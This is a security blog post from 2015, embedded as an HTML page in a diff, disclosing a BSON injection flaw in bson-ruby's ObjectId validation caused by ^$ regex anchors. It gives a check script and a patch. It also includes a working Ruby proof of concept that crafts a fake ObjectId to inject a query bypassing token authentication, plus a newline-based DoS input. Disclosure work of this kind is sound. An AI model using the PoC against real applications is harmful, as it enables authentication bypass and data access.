@@ -1,0 +1,274 @@
+
+<!doctype html>
+<html class="no-js" xmlns="https://www.w3.org/1999/xhtml"
+      xmlns:fb="https://ogp.me/ns/fb#">
+<head>
+<base href="https://sakurity.com" />
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Mongo BSON Injection: Ruby Regexps Strike Again</title>
+
+    <meta name="description" content="We do penetration testing, source code auditing and vulnerability assessments">
+    <meta name="keywords"
+          content="Billing Security, Ruby on Rails Security, OAuth Security, Bitcoin Security, Framework Vulnerabilities">
+
+
+    <link rel="icon" type="image/x-icon" href="/images/favicon.ico"/>
+    <link rel="stylesheet" href="/styles/vendor.css"/>
+    <link rel="stylesheet" href="/styles/main.css"/>
+<meta property="og:image" content="https://www.sakurity.com/images/sakurity-logo@2x.png" />
+
+
+  <link rel="canonical" href="https://sakurity.com/blog/2015/06/04/mongo_ruby_regexp.html">
+  <link rel="alternate" type="application/rss+xml" title="The Sakurity Blog" href="https://sakurity.com/blog/feed.xml" />
+
+
+
+
+
+
+</head>
+
+<body>
+
+
+<!--[if lt IE 10]>
+<p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade
+    your browser</a> to improve your experience.</p>
+<![endif]-->
+
+<nav class="top-bar row" data-topbar>
+    <section class="top-bar-section">
+
+        <ul class="left">
+            <li><a href="/">Home</a></li>
+            <li><a href="/blog">Blog</a></li>
+            <li><a href="/research">Research</a></li>
+            <li><a href="/contact">Contact Us</a></li>
+            <li><a href="https://twitter.com/SakurityNetwork">@SakurityNetwork</a></li>
+        </ul>
+
+    </section>
+</nav>
+    <div class="page-content">
+      <div class="wrapper">
+
+<div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Mongo BSON Injection: Ruby Regexps Strike Again</h1>
+  </header>
+
+  <article class="post-content">
+<p>TL;DR There’s a subtle bug in BSON-ruby implementation, leading in best case scenario to low-severity DoS, <strong>but most likely to critical BSON Injection</strong> (similar to SQL injection) - depends on gem versions you use.</p>
+
+<p>3 years ago <a href="https://homakov.blogspot.ru/2012/05/saferweb-injects-in-various-ruby.html">I wrote a blog post</a> about broken regular expressions in Ruby, <code class="highlighter-rouge">^$</code> meaning new lines <code class="highlighter-rouge">\n</code>. Back then I was only able to demonstrate XSS on Github and other websites using “javascript:a()\nhttps://”. I had a feeling there are much worse use cases of this vulnerability and here it is.</p>
+
+<h2 id="briefly-about-gems">Briefly About Gems</h2>
+
+<p>BSON is a binary-encoded serialization of JSON-like documents. MongoDB uses BSON as the data storage and network transfer format for “documents”.</p>
+
+<p>Mongoid is an ODM (Object Document Mapper) Framework for MongoDB, written in Ruby. Mongo Mapper is another ODM but less popular one.</p>
+
+<p>Moped gem is A MongoDB driver for Ruby.</p>
+
+<p>So Mongoid uses more low-level adapter Moped which uses BSON-ruby (but used to have its own implementation). Mongo Mapper uses Plucky for parsing ObjectId, which also uses BSON-ruby.</p>
+
+<p>Most likely you’re using Mongoid or Mongo Mapper, but technically the vulnerability is in <code class="highlighter-rouge">legal?</code> of BSON::ObjectId.</p>
+
+<h2 id="a-tale-of-one-regression">A Tale of One Regression</h2>
+
+<p><code class="highlighter-rouge">legal?</code> was created in Moped::BSON on Jan 23, 2012. It intended to verify the _id from user input is hexdecimal and is exactly 24 symbols. It looked like this:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">legal?</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
+  <span class="o">!!</span><span class="n">str</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/^[0-9a-f]{24}$/i</span><span class="p">)</span>
+<span class="k">end</span></code></pre></figure>
+
+<p>But this nasty <code class="highlighter-rouge">^$</code>-using Ruby code didn’t survive long - <a href="https://github.com/mongoid/moped/commit/dd5a7c14b5d2e466f7875d079af71ad19774609b#diff-3b93602f64c2fe46d38efd9f73ef5358R24">on Apr 17, 2012 it was silently replaced</a> with proper <code class="highlighter-rouge">!!str.match(/\A\h{24}\Z/i)</code></p>
+
+<p>However, on March 31, 2013 Moped deleted internal BSON module and <a href="https://github.com/mongoid/moped/commit/b64f937590c69d72fa92255e4c66d3ec126b0ff5#diff-c299a9622b71e55450c761f853668d61R6">switched to separate BSON gem</a></p>
+
+<p><img src="/img/moped.png" alt="" /></p>
+
+<p>The <code class="highlighter-rouge">legal?</code> method successfully <a href="https://github.com/mongodb/bson-ruby/commit/fef6f75413511d653c76bf924a932374a183a24f#diff-8c8558c185bbb548ccb5a6d6ac4bfee5R191">migrated to mongodb/bson-ruby</a> before that (on March 3).</p>
+
+<p>But on Apr 7 <a href="https://github.com/mongodb/bson-ruby/commit/21141c78d99f23d5f34d32010557ef19d0f77203#diff-8c8558c185bbb548ccb5a6d6ac4bfee5L219">an interesting commit happens</a>. @durran (the maintainer of all those repos), replaces <code class="highlighter-rouge">/\A\h{24}\Z/ === string.to_s</code> with vulnerable <code class="highlighter-rouge">string.to_s =~ /^[0-9a-f]{24}$/i ? true : false</code>.</p>
+
+<p>So from Apr 17 2012 to March 31 2013 moped used ^$, \A\Z until Apr 7 2013, and then ^$ until now.</p>
+
+<h2 id="am-i-vulnerable">Am I Vulnerable?</h2>
+
+<p>I see, you’re getting bored. Run this code to see if you’re vulnerable:</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">b</span><span class="o">=</span><span class="p">((</span><span class="n">defined?</span><span class="p">(</span><span class="no">Moped</span><span class="o">::</span><span class="no">BSON</span><span class="p">)</span> <span class="p">?</span> <span class="no">Moped</span><span class="o">::</span><span class="no">BSON</span> <span class="p">:</span> <span class="no">BSON</span><span class="p">)</span><span class="o">::</span><span class="no">ObjectId</span><span class="p">)</span>
+<span class="k">raise</span> <span class="s2">"DoS!"</span> <span class="k">if</span> <span class="n">b</span><span class="p">.</span><span class="nf">legal?</span> <span class="s2">"a"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+<span class="k">raise</span> <span class="s2">"Injection!"</span> <span class="k">if</span> <span class="n">b</span><span class="p">.</span><span class="nf">legal?</span> <span class="s2">"a"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">a"</span></code></pre></figure>
+
+<p>And use this patch if you indeed are! Don’t forget to alert others.</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="p">((</span><span class="n">defined?</span><span class="p">(</span><span class="no">Moped</span><span class="o">::</span><span class="no">BSON</span><span class="p">)</span> <span class="p">?</span> <span class="no">Moped</span><span class="o">::</span><span class="no">BSON</span> <span class="p">:</span> <span class="no">BSON</span><span class="p">)</span><span class="o">::</span><span class="no">ObjectId</span><span class="p">)</span><span class="o">.</span><span class="nf">legal?</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+  <span class="sr">/\A\h{24}\z/</span> <span class="o">===</span> <span class="n">s</span><span class="p">.</span><span class="nf">to_s</span>
+<span class="k">end</span></code></pre></figure>
+
+<h2 id="the-vulnerability">The Vulnerability</h2>
+
+<p>If you’re lucky enough and use old version of Moped, only light version of DoS is possible.</p>
+
+<p>Wait, did I mention another reason why Regexps in Ruby are horribly designed? There’s \A meaning the beginning and there’s \Z meaning the ending… or a new line. You’re supposed to know it. Because only \z means the ending. But most people don’t care the last <code class="highlighter-rouge">\n</code>.</p>
+
+<p><img src="/img/moped2.png" alt="" /></p>
+
+<p>So if you send something like <code class="highlighter-rouge">aaaaaaaaaaaaaaaaaaaaaaaa%0A</code> (with trailing <code class="highlighter-rouge">\n</code>), the <code class="highlighter-rouge">legal?</code> method will still return <code class="highlighter-rouge">true</code> because \Z allows the new line. But when Mongo DB receives a corrupted ObjectId it responds with <code class="highlighter-rouge">[conn1] Assertion: 10307:Client Error: bad object in message: invalid bson type in object with _id: ObjectId('aaaaaaaaaaaaaaaaaaaaaaaa')</code>.</p>
+
+<p>Which would be OK if Moped properly reacted, but currently it thinks Mongo is down and pings it 39 more times with intervals. In other words it keeps the worker busy for 5 seconds and makes x40 requests to Mongo DB. One way or another, it is Denial of Service.</p>
+
+<p>But if you’re using a newer version of BSON-ruby with ^$, the attacker can send any data to the socket with something like _id=<code class="highlighter-rouge">Any binary data\naaaaaaaaaaaaaaaaaaaaaaaa\nAny binary data</code>. With following PoC we can bypass any auth token-based system, easily DoS your app, and probably more nasty things - we can write any kind of requests to the socket!</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">'uri'</span>
+<span class="n">b</span> <span class="o">=</span> <span class="no">BSON</span><span class="o">::</span><span class="no">Document</span><span class="p">.</span><span class="nf">new</span>
+<span class="n">b</span><span class="p">[</span><span class="s2">"$query"</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"token"</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="s2">"$gt"</span><span class="o">=&gt;</span><span class="s2">""</span><span class="p">}}</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="nf">to_bson</span><span class="p">[</span><span class="mi">4</span><span class="p">.</span><span class="nf">.</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">id_ish</span> <span class="o">=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span> <span class="o">+</span> <span class="s2">"a"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="n">fake_id</span> <span class="o">=</span> <span class="s2">"a"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span>
+  <span class="s2">"</span><span class="se">\x02</span><span class="s2">_id</span><span class="se">\0</span><span class="s2">"</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="s1">'H*'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span>
+  <span class="p">[</span><span class="n">id_ish</span><span class="p">.</span><span class="nf">size</span><span class="o">/</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">].</span><span class="nf">pack</span><span class="p">(</span><span class="s1">'V'</span><span class="p">).</span><span class="nf">unpack</span><span class="p">(</span><span class="s1">'H*'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">id_ish</span> <span class="o">+</span> <span class="s2">"00"</span> <span class="o">+</span>
+  <span class="n">payload</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="s1">'H*'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+
+<span class="nb">puts</span> <span class="no">URI</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="n">fake_id</span><span class="p">)</span> <span class="c1"># looks like:</span>
+<span class="c1"># aaaaaaaaaaaaaaaaaaaaaaaa025f6964000f000000%0A%0Aaaaaaaaaaaaaaaaaaaaaaaaa%0A%0A0003247175657279001b00000003746f6b656e000f000000022467740001000000000000</span>
+
+<span class="no">User</span><span class="p">.</span><span class="nf">find</span> <span class="n">fake_id</span> <span class="c1">#returns &lt;User _id: 556f840f686f6d6746000000, token: "a"&gt;</span></code></pre></figure>
+
+<p>Thanks to <a href="https://twitter.com/judofyr">@judofyr</a> for the help with this PoC!</p>
+
+<p>ObjectId is unpacked from hex string and injected as-is into the socket (not sanitized for performance reasons, it’s supposed to be valid ObjectId). It breaks BSON format and redefines or defines new parameters of the BSON object.</p>
+
+<p>\x83\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xD4\a\x00\x00\x00\x00\x00\x00
+mng_development.users\x00\x00\x00\x00\x00\x00\x00\x00\x00Q\x00\x00\x00\a_id<strong>\x00
+\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x02_id\x00\x0F\x00\x00\x00\xAA
+\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x00\x03$query\x00\e\x00\x00
+\x00\x03token\x00\x0F\x00\x00\x00\x02$gt\x00\x01</strong>\x00\x00\x00\x00\x00\x00\x00</p>
+
+<p>Implications of this vulnerability can be huge, so patch your systems asap. Another post about dangers of BSON is coming soon, and that one impacts all platforms.</p>
+
+
+<p><a href="https://twitter.com/share" class="twitter-share-button" data-url="https://sakurity.com/blog/2015/06/04/mongo_ruby_regexp.html" data-text="Mongo BSON Injection: Ruby Regexps Strike Again" data-via="sakuritynetwork" data-related="sakuritynetwork">Share on Twitter</a>
+<script>
+!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');
+</script></p>
+
+<h3>Jun 4, 2015 • Egor Homakov (<a href='https://twitter.com/homakov'>@homakov</a>)</h3>
+
+
+<h3 class="rss-subscribe">Subscribe to our blog via <a href="https://twitter.com/SakurityNetwork">Twitter @SakurityNetwork</a>, <a href="/blog/feed.xml">RSS</a> or <a href="https://feedrabbit.com/subscriptions/new?url=https://sakurity.com/blog/feed.xml">Email</a></h3>
+  </article>
+
+
+
+
+
+
+<div id="spot-im-frame-inpage" data-post-id=""></div>
+
+
+</div></div>
+
+
+
+<div class="content">
+
+<!--<section class="inverse contact-us">
+
+    <div class="row">
+        <div class="small-12 small-text-center columns">
+            <h2>Trusted by</h2>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.coinbase.com/">
+            <div class="client client-coinbase"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.airbnb.com/">
+            <div class="client client-airbnb"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://stripe.com/">
+                <div class="client client-stripe"></div>
+            </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://www.uber.com/">
+            <div class="client client-uber"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://mixpanel.com/">
+            <div class="client client-mixpanel"></div>
+          </a>
+        </div>
+
+        <div class="small-6 medium-4 large-2 small-text-center columns clients">
+          <a href="https://wordpress.com/">
+            <div class="client client-wordpress"></div>
+          </a>
+        </div>
+    </div>
+
+
+    <div class="section-pattern">    
+        <div class="row">
+            <div class="small-10 small-centered small-text-center columns">
+
+                <p>Reach out to us if you want to see how our security audits can
+                    help your business,<br> or if you have any questions.</p>
+            </div>
+        </div>
+        <div class="row">
+            <div class="small-12 small-centered columns small-text-center">
+                <a href="/contact" class="button large pull success">Contact</a>
+            </div>
+        </div>
+    </div>
+</section>-->
+
+</div>
+
+
+
+<footer>
+    <div class="row">
+        <div class="small-6 medium-3 large-2 columns">
+            <h4>Sakurity</h4>
+            <ul>
+            <li><a href="/">Home</a></li>
+            <li><a href="/blog">Blog</a></li>
+            <li><a href="/research">Research</a></li>
+            <li><a href="/contact">Contact Us</a></li>
+            <li><a href="https://twitter.com/SakurityNetwork">@SakurityNetwork</a></li>
+            </ul>
+        </div>
+
+
+
+        <div class="small-12 medium-6 large-8 small-text-center medium-text-right columns">
+            <div class="logo-monochrome"></div>
+            <p class="copyright">Sakurity Ltd, a Hong Kong company established in 2012.<br><a href="mailto:info@sakurity.com">info@sakurity.com</a></p>
+        </div>
+    </div>
+</footer>
+</body>
+</html>
